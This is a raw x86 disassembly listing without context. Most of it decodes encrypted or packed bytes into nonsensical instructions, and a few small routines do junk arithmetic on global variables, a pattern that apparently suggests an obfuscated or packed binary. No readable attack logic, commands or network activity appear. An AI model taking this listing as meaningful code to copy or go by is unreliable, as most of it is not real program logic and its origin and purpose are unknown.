  406108:	jg     0x40608f
  40610a:	sub    al,0x20
  40610c:	inc    eax
  40610d:	dec    esp
  40610e:	jle    0x4060ec
  406110:	ror    al,0xee
  406113:	lods   al,BYTE PTR ds:[esi]
  406114:	sub    eax,0x8b7f85ab
  406119:	xchg   esi,eax
  40611a:	cmp    al,0x60
  40611c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40611d:	sbb    ebx,edi
  40611f:	inc    esp
  406120:	push   eax
  406121:	xor    ch,ah
  406123:	retf   0x5f83
  406126:	xor    ebp,DWORD PTR [esi+0x7d]
  406129:	in     eax,dx
  40612a:	mov    cl,0x14
  40612c:	aaa    
  40612d:	test   al,0x15
  40612f:	push   0x7602d3de
  406134:	xor    al,0x2b
  406136:	add    al,0x53
  406138:	dec    BYTE PTR [ecx-0x5e]
  40613b:	jmp    0x406185
  40613d:	shr    BYTE PTR [edi+0x4976bde3],0x16
  406144:	iret   
  406145:	and    bh,0x95
  406148:	sub    ebp,DWORD PTR [eax]
  40614a:	bound  eax,QWORD PTR [esi]
  40614c:	mov    ebx,0x8ebd141a
  406151:	jmp    0x40616d
  406153:	jmp    0x2e904eee
  406158:	dec    edi
  406159:	jmp    0x917b:0x48c90514
  406160:	loopne 0x4060f4
  406162:	push   cs
  406163:	push   DWORD PTR [edi+eiz*8]
  406166:	iret   
  406167:	push   esi
  406168:	or     esp,DWORD PTR [edi]
  40616a:	cmp    ebx,edx
  40616c:	outs   dx,BYTE PTR ds:[esi]
  40616d:	pusha  
  40616e:	stc    
  40616f:	lods   al,BYTE PTR ds:[esi]
  406170:	dec    esi
  406171:	mov    BYTE PTR [edx-0x5b],ah
  406174:	xchg   esp,eax
  406175:	ror    BYTE PTR [ebx+esi*4+0x684d4758],1
  40617c:	mov    ds:0xeff9b110,al
  406181:	pop    ebx
  406182:	(bad)  [edi]
  406184:	push   edi
  406185:	jmp    0x4ab1:0xd91ca20b
  40618c:	cs aas 
  40618e:	add    eax,0xb3541706
  406193:	push   edx
  406194:	mov    dh,0x65
  406196:	leave  
  406197:	call   0x2c4012a8
  40619c:	sar    esp,cl
  40619e:	test   ebp,esp
  4061a0:	out    dx,al
  4061a1:	aas    
  4061a2:	push   ebp
  4061a3:	push   ds
  4061a4:	test   DWORD PTR [edx+0x16bc26fc],eax
  4061aa:	push   ss
  4061ab:	mov    esp,0x53d9a757
  4061b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061b1:	inc    ecx
  4061b2:	sbb    bh,BYTE PTR [ecx-0x1e]
  4061b5:	ja     0x406235
  4061b7:	gs ss stc 
  4061ba:	outs   dx,BYTE PTR ds:[esi]
  4061bb:	ja     0x4061dd
  4061bd:	(bad)  
  4061bf:	sbb    al,0x8f
  4061c1:	in     eax,0xf2
  4061c3:	xor    bl,0xe
  4061c6:	fwait
  4061c7:	int3   
  4061c8:	jp     0x40614e
  4061ca:	aam    0x76
  4061cc:	es (bad) 
  4061ce:	bound  ecx,QWORD PTR [edi]
  4061d0:	pop    ecx
  4061d1:	daa    
  4061d2:	aas    
  4061d3:	sub    BYTE PTR [eax],0x62
  4061d6:	imul   BYTE PTR [edi-0x71]
  4061d9:	jmp    0x2671:0xe9163709
  4061e0:	sub    DWORD PTR [edx],esi
  4061e2:	into   
  4061e3:	mov    ds,WORD PTR [ecx-0x22]
  4061e6:	enter  0xc69a,0xd6
  4061ea:	mul    BYTE PTR [eax+0x1e2561bd]
  4061f0:	shl    al,1
  4061f2:	push   esp
  4061f3:	cdq    
  4061f4:	jl     0x4061ab
  4061f6:	adc    BYTE PTR [ebp+0x49],bl
  4061f9:	dec    esp
  4061fa:	retf   0xd2a9
  4061fd:	and    dl,BYTE PTR es:[edx-0x18]
  406201:	pop    ecx
  406202:	xchg   esp,eax
  406203:	xchg   BYTE PTR [edi],ah
  406205:	loopne 0x406260
  406207:	call   DWORD PTR [ebx-0x35]
  40620a:	push   cs
  40620b:	fs jle 0x4061e4
  40620e:	cmp    eax,ecx
  406210:	or     DWORD PTR [eax-0x2a],eax
  406213:	neg    BYTE PTR [ebx-0x3b]
  406216:	pusha  
  406217:	out    0xb1,eax
  406219:	sar    BYTE PTR [eax+0xb30cdf8],1
  40621f:	mov    esp,DWORD PTR [edx-0x5f1a6abd]
  406225:	inc    esi
  406226:	mov    esp,0x884ee6b5
  40622b:	call   0x982aa24f
  406230:	fwait
  406231:	dec    edi
  406232:	mov    dl,0xa5
  406234:	jmp    0x4061c1
  406236:	test   eax,0x9c10e1f9
  40623b:	pop    ebx
  40623c:	sbb    al,0x6b
  40623e:	scas   eax,DWORD PTR es:[edi]
  40623f:	arpl   WORD PTR [ecx+0x7710485],dx
  406245:	call   0x3605:0x9fd2db3
  40624c:	jmp    0x465:0x394f4607
  406253:	push   ds
  406254:	pop    ebx
  406255:	xor    BYTE PTR [esi],0x11
  406258:	ret    0x260f
  40625b:	jae    0x4062bf
  40625d:	pop    ds
  40625e:	retf   0xed23
  406261:	inc    ebp
  406262:	jns    0x40629c
  406264:	mov    eax,0x9deb4424
  406269:	dec    eax
  40626a:	or     ebp,ecx
  40626c:	ins    BYTE PTR es:[edi],dx
  40626d:	test   ecx,0xcf610af8
  406273:	push   0x2c
  406275:	fs std 
  406277:	fadd   st,st(7)
  406279:	jp     0x406224
  40627b:	test   al,0xc
  40627d:	xor    al,0x17
  40627f:	mov    BYTE PTR [edx+0x6a6ebd83],bl
  406285:	popf   
  406286:	fcomp  st(2)
  406288:	or     ecx,DWORD PTR [edi+ecx*8-0x749e9ee9]
  40628f:	inc    ebp
  406290:	sbb    BYTE PTR [ebx+0x2d811075],cl
  406296:	mov    ebp,edi
  406298:	inc    edx
  406299:	add    BYTE PTR [esi],al
  40629b:	inc    BYTE PTR [edx+0x0]
  40629e:	mov    DWORD PTR [esi+0xc],eax
  4062a1:	or     DWORD PTR ds:0x42e773,ecx
  4062a7:	mov    eax,DWORD PTR [ebp+0x1c]
  4062aa:	mov    DWORD PTR ds:0x42fdf2,0x1e
  4062b4:	cmp    DWORD PTR ds:0x42fdf2,0x0
  4062bb:	je     0x40630e
  4062c1:	cmp    DWORD PTR ds:0x42fdf2,0x7
  4062c8:	jne    0x4062e2
  4062ce:	push   0x4403
  4062d3:	push   DWORD PTR [ebp-0x10]
  4062d6:	push   DWORD PTR [ebp-0x24]
  4062d9:	push   DWORD PTR [ebp-0x10]
  4062dc:	call   DWORD PTR ds:0x42e5bb
  4062e2:	cmp    DWORD PTR ds:0x42fdf2,0x8
  4062e9:	jne    0x4062fc
  4062ef:	mov    esi,DWORD PTR ds:0x42fdf2
  4062f5:	dec    esi
  4062f6:	mov    DWORD PTR ds:0x42fdf2,esi
  4062fc:	mov    esi,DWORD PTR ds:0x42fdf2
  406302:	dec    esi
  406303:	mov    DWORD PTR ds:0x42fdf2,esi
  406309:	jmp    0x4062b4
  40630e:	mov    esi,DWORD PTR [ebp+0x10]
  406311:	mov    DWORD PTR [esi+0x10],eax
  406314:	mov    eax,eax
  406316:	mov    eax,DWORD PTR [ebp+0x8]
  406319:	xor    eax,ecx
  40631b:	add    eax,edx
  40631d:	jmp    0x4064e3
  406322:	jge    0x4063a3
  406324:	gs cli 
  406326:	gs (bad) 
  406329:	sti    
  40632a:	ret    
  40632b:	pusha  
  40632c:	jo     0x4062dd
  40632e:	fstp   DWORD PTR [ecx]
  406330:	pusha  
  406331:	or     BYTE PTR [esp+edi*1+0x7fa77070],0x70
  406339:	jo     0x4062ea
  40633b:	(bad)  
  40633c:	fisubr DWORD PTR ds:0xdf5802e
  406342:	mov    eax,0x77988ec
  406347:	mov    al,0xe9
  406349:	in     al,dx
  40634a:	out    0x3,al
  40634c:	lods   eax,DWORD PTR ds:[esi]
  40634d:	data16 icebp 
  40634f:	inc    esi
  406350:	cmp    al,0x6e
  406352:	inc    eax
  406353:	mov    dl,BYTE PTR [esi+0x62]
  406356:	sbb    BYTE PTR [ebx+0x17f9524c],ah
  40635c:	iret   
  40635d:	push   edi
  40635f:	xchg   edi,eax
  406360:	fadd   DWORD PTR [edx]
  406362:	fisub  DWORD PTR [ebx+0x6e]
  406365:	lods   eax,DWORD PTR ds:[esi]
  406366:	dec    ebx
  406367:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406368:	mov    bl,0x8b
  40636a:	neg    BYTE PTR [esi+0x795680ac]
  406370:	daa    
  406371:	mov    ebp,0xb1da7cd7
  406376:	clc    
  406377:	outs   dx,BYTE PTR ds:[esi]
  406378:	or     BYTE PTR [ebx],ah
  40637a:	sti    
  40637b:	and    esi,ecx
  40637d:	int3   
  40637e:	fimul  DWORD PTR [edx-0x54]
  406381:	clc    
  406382:	in     al,0x80
  406384:	and    ecx,ebx
  406386:	fwait
  406387:	jno    0x406342
  406389:	xor    DWORD PTR [ecx+0x1cd825b7],eax
  40638f:	repnz lock loope 0x406344
  406393:	inc    ebp
  406394:	cwde   
  406395:	jmp    0x69c7:0x7ae1e61e
  40639c:	or     al,0x83
  40639e:	lds    esp,FWORD PTR [edi+0x5a]
  4063a1:	jns    0x4063b9
  4063a3:	xor    BYTE PTR [edx],0x25
  4063a6:	jnp    0x4063a8
  4063a8:	fs push ds
  4063aa:	mov    edx,eax
  4063ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063ae:	lods   eax,DWORD PTR ds:[esi]
  4063af:	call   0xa924:0xbacf5cf9
  4063b6:	repz push esi
  4063b8:	inc    ebp
  4063b9:	dec    edx
  4063ba:	ins    DWORD PTR es:[edi],dx
  4063bb:	push   esi
  4063bc:	cld    
  4063bd:	lds    ebx,FWORD PTR [edx+edi*4+0x61b2b00e]
  4063c4:	cwde   
  4063c5:	jns    0x406356
  4063c7:	pop    ecx
  4063c8:	scas   eax,DWORD PTR es:[edi]
  4063c9:	fstp   TBYTE PTR [edi-0x12]
  4063cc:	or     bh,BYTE PTR [edx]
  4063ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063cf:	aas    
  4063d0:	int3   
  4063d1:	push   ds
  4063d2:	or     eax,0x639487e6
  4063d7:	xor    cl,dh
  4063d9:	add    BYTE PTR [esi],al
  4063db:	dec    eax
  4063dc:	fisub  WORD PTR [edx+edi*2+0x6c]
  4063e0:	mov    ecx,0x3649d7cb
  4063e5:	xor    bl,BYTE PTR [edi]
  4063e7:	push   0x2bdc2563
  4063ec:	jns    0x4063c8
  4063ee:	scas   al,BYTE PTR es:[edi]
  4063ef:	inc    ecx
  4063f0:	push   ebp
  4063f1:	xor    bl,ch
  4063f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f4:	pop    edx
  4063f5:	xchg   edx,eax
  4063f6:	scas   al,BYTE PTR es:[edi]
  4063f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063f8:	std    
  4063f9:	mov    dh,0x3f
  4063fb:	or     eax,0xa03460a8
  406400:	sub    al,0x4a
  406402:	mov    ebx,DWORD PTR [edx+ecx*1-0x68f69dcd]
  406409:	cli    
  40640a:	scas   al,BYTE PTR es:[edi]
  40640b:	ror    edx,1
  40640d:	inc    ecx
  40640e:	push   edx
  40640f:	mov    eax,ds:0xbaa56472
  406414:	or     DWORD PTR [ebx-0x5f2cc396],esi
  40641a:	mov    ebx,ebx
  40641c:	(bad)  
  40641d:	cmp    DWORD PTR [edi+0x57],esi
  406420:	daa    
  406421:	sbb    BYTE PTR [ecx+ebx*8+0x4a42dd80],dh
  406428:	jne    0x406428
  40642a:	cmp    edx,esi
  40642c:	imul   edx,DWORD PTR [ebx+0x4d],0xffffffb3
  406430:	mov    dl,0x31
  406432:	aad    0xa5
  406434:	lahf   
  406435:	and    eax,0xe479bcdb
  40643a:	cld    
  40643b:	jge    0x4064b2
  40643d:	jl     0x4063e8
  40643f:	shl    DWORD PTR [eax-0x601de8a4],cl
  406445:	loopne 0x40647d
  406447:	addr16 shr bl,0x0
  40644b:	pusha  
  40644c:	push   0xffffff81
  40644e:	cmp    bh,BYTE PTR [eax-0x9]
  406451:	push   ebx
  406452:	sahf   
  406453:	mov    dl,0xf3
  406455:	sbb    DWORD PTR [ecx],eax
  406457:	add    DWORD PTR ss:[ebx+0x2e],ebp
  40645b:	call   0xa9a8a4c2
  406460:	xor    BYTE PTR [ebx-0x54bd97b8],dl
  406466:	xchg   esp,eax
  406467:	adc    BYTE PTR [ebx+edi*4-0x2b7a3d8f],dl
  40646e:	mov    eax,ds:0x2bedc5bc
  406473:	adc    al,0xc6
  406475:	xor    dh,dl
  406477:	test   BYTE PTR ds:0xf2fadd2f,0x40
  40647e:	in     al,dx
  40647f:	lods   al,BYTE PTR ds:[si]
  406481:	shl    BYTE PTR [ebp+0x79],cl
  406484:	and    DWORD PTR [edi+0x28275905],eax
  40648a:	xchg   ebp,eax
  40648b:	xor    dh,bh
  40648d:	sbb    cl,BYTE PTR [eax+ecx*8]
  406490:	jnp    0x4064e6
  406492:	and    eax,0x89e65fcb
  406497:	retf   
  406498:	xor    eax,0xbf668bcc
  40649d:	dec    ebx
  40649e:	push   es
  40649f:	popa   
  4064a0:	daa    
  4064a1:	xor    ecx,ecx
  4064a3:	sbb    eax,0xcd0ddb15
  4064a8:	lods   eax,DWORD PTR ds:[esi]
  4064a9:	mov    bl,0x23
  4064ab:	bound  esp,QWORD PTR [eax+0x79]
  4064ae:	adc    edi,DWORD PTR [ebx+0x68]
  4064b1:	data16 mov ch,0x73
  4064b4:	inc    eax
  4064b5:	inc    ecx
  4064b6:	retf   
  4064b7:	jno    0x40652f
  4064b9:	push   ss
  4064ba:	xchg   esi,eax
  4064bb:	(bad)  
  4064bc:	or     ch,BYTE PTR [eax+0x1]
  4064bf:	mov    ss,WORD PTR [esi+0x68232ab]
  4064c5:	mov    esi,0x4d09d1ca
  4064ca:	push   edx
  4064cb:	xchg   ebx,eax
  4064cc:	sbb    ebp,DWORD PTR [edi]
  4064ce:	rol    DWORD PTR [edx],1
  4064d0:	inc    edi
  4064d1:	xchg   dl,al
  4064d3:	jo     0x406549
  4064d5:	in     eax,dx
  4064d6:	mov    eax,0x59558e60
  4064db:	outs   dx,DWORD PTR ds:[esi]
  4064dc:	pop    ebx
  4064dd:	xlat   BYTE PTR ds:[ebx]
  4064de:	cwde   
  4064df:	mov    ebp,esi
  4064e1:	jae    0x406465
  4064e3:	pop    esi
  4064e4:	leave  
  4064e5:	ret    0x18
  4064e8:	push   ebp
  4064e9:	mov    ebp,esp
  4064eb:	mov    eax,DWORD PTR [ebp+0xc]
  4064ee:	xor    edx,edx
  4064f0:	mov    ecx,0x7264fca9
  4064f5:	div    ecx
  4064f7:	mov    ecx,DWORD PTR [ebp+0x10]
  4064fa:	and    ecx,eax
  4064fc:	or     ecx,0x81161d8f
  406502:	mov    eax,ecx
  406504:	pop    ebp
  406505:	ret    0x18
  406508:	push   ebp
  406509:	mov    ebp,esp
  40650b:	push   ecx
  40650c:	adc    DWORD PTR ds:0x42fdf6,edi
  406512:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  406519:	mov    eax,DWORD PTR [ebp-0x4]
  40651c:	sbb    ecx,DWORD PTR ds:0x42fd79
  406522:	mov    edx,DWORD PTR [ebp+0x10]
  406525:	mov    ecx,0x7510855
  40652a:	xor    eax,ecx
  40652c:	add    eax,0x32729c
  406531:	mov    DWORD PTR [edx],eax
  406533:	sub    DWORD PTR ds:0x42fdf2,edi
  406539:	mov    eax,DWORD PTR [ebp+0x14]
  40653c:	sub    DWORD PTR ds:0x42fdf2,ecx
  406542:	mov    edx,DWORD PTR [ebp+0x10]
  406545:	and    DWORD PTR ds:0x42fd59,0x42e77b
  40654f:	mov    DWORD PTR [edx+0x4],eax
  406552:	mov    eax,DWORD PTR [ebp+0x18]
  406555:	jmp    0x4067e0
  40655a:	mov    ss,edx
  40655c:	jg     0x40659a
  40655e:	inc    ebx
  40655f:	ror    DWORD PTR [ecx+0x52],1
  406562:	jae    0x4065d2
  406564:	pop    edx
  406565:	dec    ecx
  406566:	arpl   ax,dx
  406568:	add    cl,BYTE PTR [ecx+0x33]
  40656b:	cmp    dh,BYTE PTR [eax+0x70]
  40656e:	loop   0x4065ee
  406570:	jo     0x4065e2
  406572:	lods   al,BYTE PTR ds:[esi]
  406573:	rcr    DWORD PTR [ecx],cl
  406575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406576:	adc    edi,edx
  406578:	lds    si,DWORD PTR [edx]
  40657b:	int3   
  40657c:	imul   esi,DWORD PTR [edi+0x5d],0xffffff89
  406580:	pop    esi
  406581:	mov    al,ds:0x4815042d
  406586:	js     0x406541
  406588:	outs   dx,BYTE PTR ds:[esi]
  406589:	jb     0x4065fd
  40658b:	enter  0x76d3,0xbc
  40658f:	dec    esi
  406590:	sbb    eax,0x1324e80f
  406595:	sahf   
  406596:	mov    eax,0x2a599972
  40659b:	test   al,0x73
  40659d:	jb     0x406524
  40659f:	pop    eax
  4065a0:	out    0x70,eax
  4065a2:	test   BYTE PTR [eax-0x78363c69],cl
  4065a8:	popf   
  4065a9:	(bad)  
  4065ab:	push   es
  4065ac:	sub    DWORD PTR [edx],esi
  4065ae:	xor    al,0xcb
  4065b0:	ret    0x90f2
  4065b3:	jl     0x4065e4
  4065b5:	or     eax,0x6aca6df1
  4065ba:	aad    0x86
  4065bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065bd:	pop    ebp
  4065be:	inc    edx
  4065bf:	loopne 0x406625
  4065c1:	ja     0x406593
  4065c3:	push   ebx
  4065c4:	das    
  4065c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065c6:	xor    al,0xfb
  4065c8:	sub    DWORD PTR [esi+0x66],ebx
  4065cb:	imul   esp,DWORD PTR [eax+eiz*1+0x3b40f09c],0x3e
  4065d3:	lods   al,BYTE PTR ds:[esi]
  4065d4:	mov    edi,0x6c28e77f
  4065d9:	sub    ch,ch
  4065db:	ror    DWORD PTR [esi-0x7a],cl
  4065de:	mov    ds:0xb94638cf,eax
  4065e3:	or     DWORD PTR [edi+0x6053d446],ecx
  4065e9:	imul   edi,DWORD PTR [edi],0x38
  4065ec:	into   
  4065ed:	jb     0x4065c4
  4065ef:	dec    eax
  4065f0:	mov    bl,0xc7
  4065f2:	push   cs
  4065f3:	stos   DWORD PTR es:[edi],eax
  4065f4:	add    al,0x18
  4065f6:	mov    eax,ds:0x8f4e5ff5
  4065fb:	loope  0x406653
  4065fd:	inc    esi
  4065fe:	mov    bl,0xfd
  406600:	add    BYTE PTR [esi+0x22],0x30
  406604:	test   ch,ch
  406606:	aam    0x9c
  406608:	adc    al,0x3a
  40660a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40660b:	test   eax,0xc1bc90d
  406610:	test   al,0x56
  406612:	mov    edx,0x20555f2e
  406617:	xchg   ebp,eax
  406618:	fwait
  406619:	cmp    esi,ecx
  40661b:	mov    cl,0xdc
  40661d:	jge    0x4065f2
  40661f:	push   eax
  406620:	lds    edi,FWORD PTR [ecx]
  406622:	arpl   WORD PTR [edx],dx
  406624:	dec    esp
  406625:	aad    0x25
  406627:	pop    edx
  406628:	cmc    
  406629:	dec    esi
  40662a:	lds    ebx,FWORD PTR [ebp-0x4a]
  40662d:	xchg   DWORD PTR [edi-0x18],ebx
  406630:	cmc    
  406631:	dec    ebx
  406632:	test   DWORD PTR [edx],ecx
  406634:	dec    edx
  406635:	outs   dx,DWORD PTR ds:[esi]
  406636:	fwait
  406637:	push   ss
  406638:	xchg   esp,eax
  406639:	xor    ch,BYTE PTR [ebx+0x75c82482]
  40663f:	cld    
  406640:	sbb    eax,0x18620242
  406645:	mov    eax,0x931edd56
  40664a:	je     0x40666b
  40664c:	cmp    DWORD PTR [ecx],esi
  40664e:	stc    
  40664f:	push   ss
  406650:	or     BYTE PTR [edi],0x36
  406653:	sub    eax,0xee9b065a
  406658:	sar    DWORD PTR [ebx+0x49209ac7],0x1
  40665f:	mov    bh,0x5
  406661:	cmp    DWORD PTR [ebp+0x4b],ebp
  406664:	shr    DWORD PTR [edx-0x2207c1ad],1
  40666a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40666b:	xchg   esi,eax
  40666c:	icebp  
  40666d:	fisttp QWORD PTR [ebp-0x6b]
  406670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406671:	ficomp WORD PTR [eax+0x31]
  406674:	lods   eax,DWORD PTR ds:[esi]
  406675:	sub    DWORD PTR [ecx-0x80],0xfdfef4a3
  40667c:	out    dx,al
  40667d:	not    DWORD PTR [ebx+0x70]
  406680:	xchg   DWORD PTR ds:0x2f47af59,ebx
  406686:	or     cl,BYTE PTR [ecx+0xb]
  406689:	push   ecx
  40668a:	push   cs
  40668b:	add    al,0xb5
  40668d:	xchg   edx,eax
  40668e:	cmp    DWORD PTR [edx],eax
  406690:	rcr    DWORD PTR [ebx+0x6a],1
  406693:	loope  0x40665b
  406695:	in     al,0x4b
  406697:	xchg   BYTE PTR [ecx],bh
  406699:	xlat   BYTE PTR ds:[ebx]
  40669a:	pop    ebp
  40669b:	or     ebx,DWORD PTR [eax-0x2139fd25]
  4066a1:	fninit 
  4066a3:	aad    0x4d
  4066a5:	xor    DWORD PTR ds:0xfc69ca63,edx
  4066ab:	jns    0x4066d8
  4066ad:	int3   
  4066ae:	fnstcw WORD PTR [edx-0x5a24ce5e]
  4066b4:	xor    eax,0xb70b088d
  4066b9:	outs   dx,BYTE PTR ds:[esi]
  4066ba:	xchg   edi,eax
  4066bb:	mov    ds:0xe70ceca1,eax
  4066c0:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066c2:	inc    eax
  4066c3:	out    dx,al
  4066c4:	mov    al,0x76
  4066c6:	(bad)  
  4066c7:	mov    bl,0x9c
  4066c9:	push   cs
  4066ca:	jp     0x40669a
  4066cc:	repnz cwde 
  4066ce:	outs   dx,BYTE PTR ds:[esi]
  4066cf:	mov    edx,0x17bbb67b
  4066d4:	jge    0x4066e6
  4066d6:	or     DWORD PTR [ebp-0x6d5d9c2a],esp
  4066dc:	(bad)  
  4066dd:	pushf  
  4066de:	adc    al,0x1e
  4066e0:	fstp   TBYTE PTR [ebp+0xa]
  4066e3:	xor    ch,bl
  4066e5:	stos   BYTE PTR es:[edi],al
  4066e6:	xchg   DWORD PTR [ecx+0x11],ebx
  4066e9:	frstor [eax+0x15]
  4066ec:	sbb    DWORD PTR [edi-0x496abea5],edx
  4066f2:	test   DWORD PTR [ebp-0x63],0x49053890
  4066f9:	xchg   ebp,eax
  4066fa:	lock sub bh,bl
  4066fd:	pusha  
  4066fe:	pusha  
  4066ff:	fdivr  QWORD PTR [ecx]
  406701:	xchg   ecx,eax
  406702:	test   eax,0xdf0e0909
  406707:	inc    ebp
  406708:	sbb    ecx,DWORD PTR [ebx-0x1e]
  40670b:	ffreep st(1)
  40670d:	call   0x1b5e3cac
  406712:	aaa    
  406713:	inc    edi
  406714:	imul   ebx,edx,0xffffff9f
  406717:	call   FWORD PTR [eax+0x5922d243]
  40671d:	mov    cl,0xc7
  40671f:	pop    edi
  406720:	scas   al,BYTE PTR es:[edi]
  406721:	je     0x4066be
  406723:	mov    ebx,0x6f3b6396
  406728:	sub    BYTE PTR [esi+ecx*8-0x6b],bl
  40672c:	xchg   DWORD PTR [ecx],ecx
  40672e:	dec    edi
  40672f:	sti    
  406730:	jmp    0x406745
  406732:	ror    BYTE PTR [edi+0x59890358],0x46
  406739:	mov    dl,0x4b
  40673b:	push   cs
  40673c:	les    esi,FWORD PTR [ecx]
  40673e:	cmp    DWORD PTR [edx],0x38
  406741:	popf   
  406742:	and    dl,0x4d
  406745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406746:	xchg   edi,eax
  406747:	pop    ebp
  406748:	adc    al,0x45
  40674a:	pop    esi
  40674b:	xchg   ebp,eax
  40674c:	icebp  
  40674d:	(bad)  
  40674e:	xlat   BYTE PTR ds:[ebx]
  40674f:	test   eax,0xb686b5c0
  406754:	sbb    dh,0x3b
  406757:	mov    ds:0xc925b2a8,eax
  40675c:	ja     0x406717
  40675e:	sti    
  40675f:	and    BYTE PTR [edi+0x1f40a069],ah
  406765:	ret    0xc73c
  406768:	rcr    ebp,0x53
  40676b:	xor    ebx,DWORD PTR [ebp-0x63]
  40676e:	adc    eax,0x48e2f208
  406773:	cmp    DWORD PTR [ebp+0x35],0x7d
  406777:	dec    eax
  406778:	and    al,0x2f
  40677a:	adc    al,0x3f
  40677c:	mov    cl,0xcc
  40677e:	jp     0x40677e
  406780:	inc    ebx
  406781:	(bad)  
  406782:	aad    0xa6
  406784:	mov    BYTE PTR [eax-0x31f8976a],0xbb
  40678b:	(bad)  
  40678c:	jecxz  0x4067a2
  40678e:	mov    edi,0xe61c2776
  406793:	lods   eax,DWORD PTR ds:[esi]
  406794:	inc    eax
  406795:	xchg   edx,eax
  406796:	es out dx,al
  406798:	fcmovnb st,st(0)
  40679a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40679b:	inc    esp
  40679c:	(bad)  
  40679e:	sbb    DWORD PTR [esi-0x23a8803],edx
  4067a4:	in     eax,0x4d
  4067a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067a7:	push   ss
  4067a8:	cmp    DWORD PTR [ebp+0x15],edi
  4067ab:	call   0x10bb6cbd
  4067b0:	in     al,dx
  4067b1:	adc    eax,0x7d00500f
  4067b6:	test   eax,0x73000afc
  4067bb:	out    dx,eax
  4067bc:	push   esi
  4067bd:	pop    esi
  4067be:	(bad)  
  4067c0:	aaa    
  4067c1:	jmp    0xd635:0x69b9df74
  4067c8:	fld    st(1)
  4067ca:	pop    edx
  4067cb:	in     eax,0x2c
  4067cd:	leave  
  4067ce:	mov    edx,0x6fe74fed
  4067d3:	(bad)  
  4067d4:	out    0xd9,eax
  4067d6:	shr    BYTE PTR [ecx+0x456a3a7e],cl
  4067dc:	sub    DWORD PTR [ebx+0x558bbc11],esp
  4067e2:	adc    BYTE PTR [ecx-0x3dccf7be],cl
  4067e8:	mov    eax,DWORD PTR [ebp+0x1c]
  4067eb:	mov    edx,DWORD PTR [ebp+0x10]
  4067ee:	adc    DWORD PTR ds:0x42fd55,0x1a3e
  4067f8:	mov    DWORD PTR [edx+0xc],eax
  4067fb:	mov    eax,DWORD PTR [ebp+0x20]
  4067fe:	or     DWORD PTR ds:0x42e1a0,0x7513
  406808:	mov    edx,DWORD PTR [ebp+0x10]
  40680b:	sub    DWORD PTR ds:0x42e77b,0x76c6
  406815:	mov    DWORD PTR [edx+0x10],eax
  406818:	and    DWORD PTR ds:0x42fd65,0x42e793
  406822:	mov    eax,eax
  406824:	mov    eax,DWORD PTR [ebp+0x14]
  406827:	test   eax,eax
  406829:	mov    eax,DWORD PTR [ebp+0x8]
  40682c:	jne    0x406ac0
  406832:	mov    eax,DWORD PTR [ebp+0xc]
  406835:	jmp    0x406ac0
  40683a:	sub    DWORD PTR ds:0x49e98909,edi
  406840:	test   eax,0xf5555d5d
  406845:	pushf  
  406846:	fsub   QWORD PTR [ebp-0x54]
  406849:	out    dx,al
  40684a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40684b:	cmp    BYTE PTR [eax+0x70],dh
  40684e:	loop   0x4068ce
  406850:	jo     0x4068c2
  406852:	(bad)  
  406853:	addr16 add al,0xcc
  406856:	mov    cl,0x19
  406858:	adc    DWORD PTR [eax],0x688f5ba8
  40685e:	fwait
  40685f:	mov    al,ds:0x1891878d
  406864:	aaa    
  406865:	and    DWORD PTR [ebx+edx*4],esp
  406868:	xchg   edi,eax
  406869:	xchg   esi,eax
  40686a:	or     BYTE PTR [edx],0x48
  40686d:	dec    ebx
  40686e:	push   ecx
  40686f:	sub    al,0xab
  406871:	mov    cl,0x9b
  406873:	(bad)  
  406874:	leave  
  406875:	dec    edi
  406876:	out    0xaf,al
  406878:	add    bh,BYTE PTR [edx]
  40687a:	add    bh,ah
  40687c:	and    edx,0x16
  40687f:	in     al,dx
  406880:	inc    eax
  406881:	and    dl,ch
  406883:	inc    ebx
  406884:	out    dx,al
  406885:	stos   BYTE PTR es:[edi],al
  406886:	sti    
  406887:	(bad)  
  406888:	adc    al,0xa4
  40688a:	sbb    BYTE PTR [eax],ah
  40688c:	mov    ds:0xaca5cc4d,eax
  406891:	and    DWORD PTR [esi-0x29],edi
  406894:	mov    ds:0x184ff262,al
  406899:	xor    eax,0xd17fd7be
  40689e:	inc    ebx
  40689f:	out    0x4,al
  4068a1:	xor    al,0xdd
  4068a3:	xor    eax,DWORD PTR [eax]
  4068a5:	xchg   esi,eax
  4068a6:	xchg   edi,eax
  4068a7:	imul   edx,edi,0xffffffd9
  4068aa:	les    ebx,FWORD PTR [edi-0x6725229b]
  4068b0:	push   0x47372df0
  4068b5:	in     eax,0x5c
  4068b7:	dec    ebp
  4068b8:	or     BYTE PTR [eax],0x42
  4068bb:	mov    al,ds:0xfb4aecef
  4068c0:	popf   
  4068c1:	fwait
  4068c2:	pushf  
  4068c3:	lds    ecx,FWORD PTR [esi+0x65]
  4068c6:	sar    BYTE PTR [eax+0x1c33bea9],cl
  4068cc:	inc    ebx
  4068cd:	lods   al,BYTE PTR ds:[esi]
  4068ce:	mov    ecx,DWORD PTR [edi]
  4068d0:	jne    0x406876
  4068d2:	sbb    ebp,DWORD PTR [eax+0x58]
  4068d5:	xchg   DWORD PTR [esi-0x6b],esi
  4068d8:	jle    0x406892
  4068da:	aad    0x43
  4068dc:	xor    al,0x33
  4068de:	sbb    ch,bl
  4068e0:	int    0xf
  4068e2:	fstp   TBYTE PTR [ebp+0x25]
  4068e5:	retf   0xc10b
